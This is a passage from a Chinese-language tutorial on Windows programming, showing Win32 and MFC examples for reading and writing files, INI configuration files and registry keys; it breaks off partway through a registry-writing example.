class="comment">//要写入的字节数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPDWORD      lpNumberOfBytesWritten, <span class="comment">//用来接收实际写入到文件的字节数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPOVERLAPPED lpOverlapped</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">WINBASEAPI</span></span><br><span class="line"><span class="function">BOOL</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">WriteFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_         HANDLE hFile,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_reads_bytes_opt_(nNumberOfBytesToWrite) LPCVOID lpBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_         DWORD nNumberOfBytesToWrite,<span class="comment">//要写入的字节数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_    LPDWORD lpNumberOfBytesWritten,<span class="comment">//用来接收实际写入到文件的字节数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Inout_opt_  LPOVERLAPPED lpOverlapped        <span class="comment">//默认NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p>📋Windows API读写示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCFileDlg::OnBnClickedWriteFileWin</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// WIN32写文件 dwCreationDisposition = CREATE_NEW | OPEN_EXISTING ...</span></span><br><span class="line">    HANDLE hFile = <span class="built_in">CreateFile</span>(<span class="string">&quot;3.txt&quot;</span>, GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//此处可能因为文件已经存在而创建失败</span></span><br><span class="line">        <span class="built_in">TRACE</span>(<span class="string">&quot;### error = %d ####&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="string">&quot;创建文件对象失败!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//写文件</span></span><br><span class="line">    <span class="type">char</span> szBuf[<span class="number">1024</span>] = <span class="string">&quot;Win32操作文件---&quot;</span>;</span><br><span class="line">    DWORD dwWrite;</span><br><span class="line">    <span class="built_in">WriteFile</span>(hFile, szBuf, <span class="built_in">strlen</span>(szBuf), &amp;dwWrite, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">TRACE</span>(<span class="string">&quot;### dwWrite = %d ####&quot;</span>, dwWrite);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCFileDlg::OnBnClickedReadFileWin</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// WIN32读文件</span></span><br><span class="line">    HANDLE hFile = <span class="built_in">CreateFile</span>(<span class="string">&quot;3.txt&quot;</span>, GENERIC_READ, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">TRACE</span>(<span class="string">&quot;### error = %d ####&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="string">&quot;创建文件对象失败!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//读文件</span></span><br><span class="line">    DWORD dwRead;</span><br><span class="line">    <span class="type">char</span> szBuf[<span class="number">1024</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="built_in">ReadFile</span>(hFile, szBuf, <span class="number">1024</span>, &amp;dwRead, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">TRACE</span>(<span class="string">&quot;### dwRead = %d ####&quot;</span>, dwRead);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="built_in">MessageBox</span>(szBuf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h4 id="9-1-4-MFC操作文件"><a href="#9-1-4-MFC操作文件" class="headerlink" title="9.1.4 MFC操作文件"></a>9.1.4 MFC操作文件</h4><p>📋MFC读写示例：【类似C++】</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCFileDlg::OnBnClickedWriteFileMfc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// MFC写文件</span></span><br><span class="line">    <span class="function">CFile <span class="title">file</span><span class="params">(<span class="string">&quot;4.txt&quot;</span>, CFile::modeCreate | CFile::modeWrite)</span></span>;</span><br><span class="line">    <span class="type">char</span> szBuf[<span class="number">1024</span>] = <span class="string">&quot;MFC文件操作&quot;</span>;</span><br><span class="line">    file.<span class="built_in">Write</span>(szBuf, <span class="built_in">strlen</span>(szBuf));</span><br><span class="line">    file.<span class="built_in">Close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCFileDlg::OnBnClickedReadFileMfc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// MFC读文件</span></span><br><span class="line">    <span class="comment">/*CFile file(&quot;4.txt&quot;,  CFile::modeRead);</span></span><br><span class="line"><span class="comment">    char szBuf[1024] = &quot;&quot;;</span></span><br><span class="line"><span class="comment">    file.Read(szBuf, 1024);</span></span><br><span class="line"><span class="comment">    file.Close();</span></span><br><span class="line"><span class="comment">    MessageBox(szBuf);*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// MFC读文件[高级操作]:对话框选择</span></span><br><span class="line">    <span class="function">CFileDialog <span class="title">fileDlg</span><span class="params">(TRUE)</span></span>;</span><br><span class="line">    fileDlg.m_ofn.lpstrTitle = <span class="string">&quot;Test&quot;</span>;<span class="comment">//标签</span></span><br><span class="line">    fileDlg.m_ofn.lpstrFilter = <span class="string">&quot;Text Files(*.txt)\0*.txt\0ALL Files(*.*)\0*.*\0\0&quot;</span>;<span class="comment">//过滤器</span></span><br><span class="line"></span><br><span class="line">    DWORD dwFileLen;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (IDOK == fileDlg.<span class="built_in">DoModal</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function">CFile <span class="title">file</span><span class="params">(fileDlg.GetFileName(), CFile::modeRead)</span></span>;<span class="comment">//打开任何文件</span></span><br><span class="line">        dwFileLen = file.<span class="built_in">GetLength</span>();</span><br><span class="line">        <span class="type">char</span> szBuf[<span class="number">1024</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">//file.Read(szBuf, 1024);</span></span><br><span class="line">        file.<span class="built_in">Read</span>(szBuf, dwFileLen);</span><br><span class="line">        file.<span class="built_in">Close</span>();</span><br><span class="line">        <span class="built_in">MessageBox</span>(szBuf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="./9-1.png"></p><br><h3 id="9-2-配置文件的访问与读写"><a href="#9-2-配置文件的访问与读写" class="headerlink" title="9.2 配置文件的访问与读写"></a>9.2 配置文件的访问与读写</h3><p><code>ini</code>的配置文件有一定的格式，如键值对。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//写配置文件【如果函数成功将字符串复制到初始化文件，则返回值为非零；失败返回0】</span></span><br><span class="line"><span class="function">BOOL <span class="title">WritePrivateProfileStringW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] LPCWSTR lpAppName,<span class="comment">//将字符串复制到的节的名称。 如果该节不存在，则会创建它。 节的名称与大小写无关;字符串可以是大小写字母的任意组合。</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] LPCWSTR lpKeyName,<span class="comment">//要与字符串关联的键的名称。 如果指定节中不存在该键，则会创建它。 如果此参数 NULL，则会删除整个节（包括节中的所有条目）。</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] LPCWSTR lpString,<span class="comment">//要写入文件的 null终止字符串。 如果此参数 NULL，则删除 lpKeyName 参数指向的键。</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] LPCWSTR lpFileName<span class="comment">//如果文件已存在并且由 Unicode 字符组成，则函数会将 Unicode 字符写入文件。 否则，该函数将写入 ANSI 字符。</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读配置文件</span></span><br><span class="line"><span class="function">DWORD</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">GetPrivateProfileStringW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCWSTR lpAppName,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCWSTR lpKeyName,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCWSTR lpDefault,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_writes_to_opt_(nSize, <span class="keyword">return</span> + <span class="number">1</span>) LPWSTR lpReturnedString,<span class="comment">//目标Buffer</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_     DWORD nSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCWSTR lpFileName</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCFileDlg::OnBnClickedWriteFileIni</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 写配置文件</span></span><br><span class="line">    <span class="type">char</span> szPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">GetCurrentDirectory</span>(MAX_PATH, szPath);<span class="comment">//拿到当前路径</span></span><br><span class="line"></span><br><span class="line">    CString szPathFile;</span><br><span class="line">    szPathFile.<span class="built_in">Format</span>(<span class="string">&quot;%s\\Test.ini&quot;</span>,szPath);<span class="comment">//字符串拼接</span></span><br><span class="line">    <span class="comment">//处理可能的字符集问题</span></span><br><span class="line">    <span class="comment">/*char szMyPath[MAX_PATH] = &#123; 0 &#125;;</span></span><br><span class="line"><span class="comment">    sprintf(szMyPath, &quot;%s\\Test.ini&quot;, szPath);*/</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">WritePrivateProfileString</span>(<span class="string">&quot;国家&quot;</span>,<span class="string">&quot;中国&quot;</span>,<span class="string">&quot;ZH&quot;</span>, szPathFile);</span><br><span class="line">    <span class="built_in">WritePrivateProfileString</span>(<span class="string">&quot;国家&quot;</span>, <span class="string">&quot;美国&quot;</span>, <span class="string">&quot;USA&quot;</span>, szPathFile);</span><br><span class="line">    <span class="built_in">WritePrivateProfileString</span>(<span class="string">&quot;国家&quot;</span>, <span class="string">&quot;俄罗斯&quot;</span>, <span class="string">&quot;RUS&quot;</span>, szPathFile);</span><br><span class="line">    <span class="built_in">WritePrivateProfileString</span>(<span class="string">&quot;地区&quot;</span>, <span class="string">&quot;天津&quot;</span>, <span class="string">&quot;T&quot;</span>, szPathFile);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">////获取当前路径</span></span><br><span class="line">    <span class="comment">//WCHAR strPath[MAX_PATH] = &#123; 0 &#125;;</span></span><br><span class="line">    <span class="comment">//GetCurrentDirectoryW(MAX_PATH, strPath);</span></span><br><span class="line">    <span class="comment">//TRACE(&quot;##strPath = %ls&quot;, strPath);</span></span><br><span class="line">    <span class="comment">////  当前路径 D:\Users\82835\source\repos\MyMFCFile\ + Test.ini</span></span><br><span class="line">    <span class="comment">//CString strFilePath2;</span></span><br><span class="line">    <span class="comment">//strFilePath2.Format(L&quot;%ls//Test.ini&quot;, strPath);//UNICODE下</span></span><br><span class="line">    <span class="comment">//WritePrivateProfileStringW(L&quot;metadata&quot;, L&quot;title&quot;, L&quot;搜狗双拼&quot;, strFilePath2);</span></span><br><span class="line">    <span class="comment">//WritePrivateProfileStringW(L&quot;声母&quot;, L&quot;ch&quot;, L&quot;I&quot;, strFilePath2);</span></span><br><span class="line">    <span class="comment">//WritePrivateProfileStringW(L&quot;声母&quot;, L&quot;sh&quot;, L&quot;U&quot;, strFilePath2);</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCFileDlg::OnBnClickedReadFileIni</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 读配置文件</span></span><br><span class="line">    <span class="type">char</span> szPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">GetCurrentDirectory</span>(MAX_PATH, szPath);<span class="comment">//拿到当前路径</span></span><br><span class="line"></span><br><span class="line">    CString szPathFile;</span><br><span class="line">    szPathFile.<span class="built_in">Format</span>(<span class="string">&quot;%s\\Test.ini&quot;</span>, szPath);<span class="comment">//字符串拼接</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> str1[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">char</span> str2[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">char</span> str3[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">char</span> str4[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    DWORD dwNum1 = <span class="built_in">GetPrivateProfileString</span>(<span class="string">&quot;国家&quot;</span>, <span class="string">&quot;中国&quot;</span>, <span class="literal">NULL</span>, str1,<span class="number">1024</span>,szPathFile);</span><br><span class="line">    DWORD dwNum2 = <span class="built_in">GetPrivateProfileString</span>(<span class="string">&quot;国家&quot;</span>, <span class="string">&quot;美国&quot;</span>, <span class="literal">NULL</span>, str2, <span class="number">1024</span>, szPathFile);</span><br><span class="line">    DWORD dwNum3 = <span class="built_in">GetPrivateProfileString</span>(<span class="string">&quot;国家&quot;</span>, <span class="string">&quot;俄罗斯&quot;</span>, <span class="literal">NULL</span>, str3, <span class="number">1024</span>, szPathFile);</span><br><span class="line">    DWORD dwNum4 = <span class="built_in">GetPrivateProfileString</span>(<span class="string">&quot;地区&quot;</span>, <span class="string">&quot;天津&quot;</span>, <span class="literal">NULL</span>, str4, <span class="number">1024</span>, szPathFile);</span><br><span class="line"></span><br><span class="line">    CString  strShow;</span><br><span class="line">    strShow.<span class="built_in">Format</span>(<span class="string">&quot;中国 = %s\n美国 = %s\n俄罗斯 = %s\n天津 = %s&quot;</span>, str1, str2, str3, str4);</span><br><span class="line">    <span class="built_in">MessageBox</span>(strShow);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//可参考的读配置文件【UNICODE】</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyMFCFileView::OnReadConfig</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//获取当前路径</span></span><br><span class="line">    WCHAR strPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    WCHAR strTitle[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    WCHAR strCh[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    WCHAR strSh[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">GetCurrentDirectoryW</span>(MAX_PATH, strPath);</span><br><span class="line">    <span class="built_in">TRACE</span>(<span class="string">&quot;##strPath = %ls&quot;</span>, strPath);</span><br><span class="line">    <span class="comment">//  当前路径 D:\Users\82835\source\repos\MyMFCFile\ + Test.ini</span></span><br><span class="line">    CString strFilePath;</span><br><span class="line">    strFilePath.<span class="built_in">Format</span>(<span class="string">L&quot;%ls//Test.ini&quot;</span>, strPath);</span><br><span class="line"></span><br><span class="line">    DWORD dwNum1 = <span class="built_in">GetPrivateProfileStringW</span>(<span class="string">L&quot;metadata&quot;</span>, <span class="string">L&quot;title&quot;</span>,<span class="literal">NULL</span>,</span><br><span class="line">        strTitle, MAX_PATH, strFilePath);</span><br><span class="line"></span><br><span class="line">    DWORD dwNum2 = <span class="built_in">GetPrivateProfileStringW</span>(<span class="string">L&quot;声母&quot;</span>, <span class="string">L&quot;ch&quot;</span>, <span class="literal">NULL</span>,</span><br><span class="line">        strCh, MAX_PATH, strFilePath);</span><br><span class="line"></span><br><span class="line">    DWORD dwNum3 = <span class="built_in">GetPrivateProfileStringW</span>(<span class="string">L&quot;声母&quot;</span>, <span class="string">L&quot;sh&quot;</span>, <span class="literal">NULL</span>,</span><br><span class="line">        strSh, MAX_PATH, strFilePath);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">TRACE</span>(<span class="string">&quot;####dwNum1 = %d, dwNum2 = %d, dwNum3 = %d&quot;</span>, dwNum1, dwNum2, dwNum3);</span><br><span class="line">     	USES_CONVERSION;</span><br><span class="line">      <span class="type">char</span>* szTitle = <span class="built_in">W2A</span>(strTitle);</span><br><span class="line">    <span class="type">char</span>* szCh= <span class="built_in">W2A</span>(strCh);</span><br><span class="line">    <span class="type">char</span>* szSh = <span class="built_in">W2A</span>(strSh);</span><br><span class="line">    <span class="built_in">TRACE</span>(<span class="string">&quot;####strTitle = %s, strCh = %s, strSh = %s&quot;</span>, szTitle, szCh, szSh);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><h3 id="9-3-注册表编程"><a href="#9-3-注册表编程" class="headerlink" title="9.3 注册表编程"></a>9.3 注册表编程</h3><h4 id="9-3-1-注册表API"><a href="#9-3-1-注册表API" class="headerlink" title="9.3.1 注册表API"></a>9.3.1 注册表API</h4><blockquote><p>注册表操作需要操作系统权限，需要退出VS，再使用管理员权限打开</p><p>注册表：Win+ R组合键 ：regedit</p></blockquote><p>注册表存储在二进制文件里面，<code>win32</code> API提供了大量函数来操作注册表。常用的注册表<code>API</code>如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建注册表【创建新的】</span></span><br><span class="line"><span class="comment">//如果函数成功，则返回值为 ERROR_SUCCESS;</span></span><br><span class="line"><span class="comment">//如果函数失败，则返回值为 Winerror.h 中定义的非零错误代码</span></span><br><span class="line">WINADVAPI    <span class="comment">//__declspec(dllimport)</span></span><br><span class="line">LSTATUS        <span class="comment">//LONG</span></span><br><span class="line">APIENTRY    <span class="comment">//WINAPI</span></span><br><span class="line"><span class="built_in">RegCreateKeyW</span>(</span><br><span class="line">    _In_ HKEY hKey,       <span class="comment">//打开的当前项的句柄，实际上就是那几个分支</span></span><br><span class="line">    _In_opt_ LPCWSTR lpSubKey,<span class="comment">//打开或者创建的表项的名称</span></span><br><span class="line">    _Out_ PHKEY phkResult   <span class="comment">//用来接收创建或者打开表项句柄 regclosekey</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">//打开注册表【打开已存在的】【参数与创建注册表函数一致】</span></span><br><span class="line"><span class="built_in">RegOpenKeyW</span>(</span><br><span class="line">    _In_ HKEY hKey,   <span class="comment">//打开的当前项的句柄 实际上就是那几个分支</span></span><br><span class="line">    _In_opt_ LPCWSTR lpSubKey,</span><br><span class="line">    _Out_ PHKEY phkResult</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">//写入注册表</span></span><br><span class="line"><span class="built_in">RegSetValueW</span>(</span><br><span class="line">    _In_ HKEY hKey,       <span class="comment">//打开的当前项的句柄 实际上就是那几个分支</span></span><br><span class="line">    _In_opt_ LPCWSTR lpSubKey,  <span class="comment">//打开或者创建的表项的名称</span></span><br><span class="line">    _In_ DWORD dwType,   <span class="comment">//指示被存储信息的类型 REG_SZ类型</span></span><br><span class="line">    _In_reads_bytes_opt_(cbData) LPCWSTR lpData,<span class="comment">//要存放到注册表里面的数据</span></span><br><span class="line">    _In_ DWORD cbData <span class="comment">//要存放的字符串数据的大小、长度</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//写入注册表【扩展版本】</span></span><br><span class="line"><span class="built_in">RegSetValueExW</span>(</span><br><span class="line">    _In_ HKEY hKey,     <span class="comment">//打开的当前项的句柄 实际上就是那几个分支</span></span><br><span class="line">    _In_opt_ LPCWSTR lpValueName,     <span class="comment">//指向一个字符串的指针，包含了将要设置值的名称</span></span><br><span class="line">    _Reserved_ DWORD Reserved,        <span class="comment">//保留参数 0 | NULL</span></span><br><span class="line">    _In_ DWORD dwType,                <span class="comment">//REG_BINARY | REG_SZ 等等</span></span><br><span class="line">    _In_reads_bytes_opt_(cbData) CONST BYTE * lpData,<span class="comment">//强转后的数据指针</span></span><br><span class="line">    _In_ DWORD cbData                <span class="comment">//大小【单位字节】</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询注册表【读】</span></span><br><span class="line"><span class="function">LSTATUS <span class="title">RegQueryValueExA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                HKEY    hKey,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPCSTR  lpValueName,</span></span></span><br><span class="line"><span class="params"><span class="function">                      LPDWORD lpReserved,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional]     LPDWORD lpType,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional]     LPBYTE  lpData,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out, optional] LPDWORD lpcbData</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭注册表</span></span><br><span class="line"><span class="function">LSTATUS <span class="title">RegCloseKey</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] HKEY hKey</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><br><h4 id="9-3-2-注册表读写"><a href="#9-3-2-注册表读写" class="headerlink" title="9.3.2 注册表读写"></a>9.3.2 注册表读写</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCFileDlg::OnBnClickedWriteFileReg</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 写注册表</span></span><br><span class="line">    HKEY hKey;</span><br><span class="line">    DWORD dwWeight=<span 